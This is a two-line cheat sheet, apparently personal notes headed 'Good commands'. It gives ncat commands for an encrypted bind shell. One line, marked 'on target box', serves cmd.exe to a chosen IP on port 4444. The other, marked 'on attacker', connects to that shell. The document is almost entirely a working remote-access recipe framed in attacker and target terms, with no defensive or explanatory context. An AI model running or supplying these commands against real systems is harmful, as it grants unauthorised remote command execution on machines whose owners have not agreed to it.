Good commands

on target box

`ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl`

on attacker

`ncat -v 10.0.0.22 4444 --ssl`
